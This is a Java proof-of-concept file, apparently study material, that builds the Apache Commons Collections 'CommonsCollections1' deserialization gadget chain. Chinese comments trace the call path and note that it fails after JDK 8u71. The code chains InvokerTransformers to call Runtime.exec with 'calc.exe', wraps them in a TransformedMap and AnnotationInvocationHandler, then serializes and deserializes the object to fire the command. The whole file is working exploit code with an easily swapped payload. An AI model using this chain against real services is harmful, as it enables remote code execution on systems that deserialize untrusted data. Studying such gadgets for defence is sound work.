package com.govuln.deserialization;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * 这个也不是官方的cc1，是国内的cc1，官方的cc1用到两次AnnotationInvocationHandler和lazyMap
 */
class CommonsCollections1 {

    /**
     * AnnotationInvocationHandler#readObject()    !!!jdk8u71之后AnnotationInvocationHandler改动导致这里断了
     *      TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)
     *      TransformedMap#checkSetValue(value)
     *          transformerChain#transform()
     */
    public static void main(String[] args) throws Exception {
        // 序列化的对象和所有它使用的内部属性对象，必须都实现了java.io.Serializable接口。
        // 所以这里要用InvokerTransformer转换。
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        // TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value) --> transformerChain#transform() --> transformerChain#transform()
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        // AnnotationInvocationHandler#readObject() --> TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream  oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
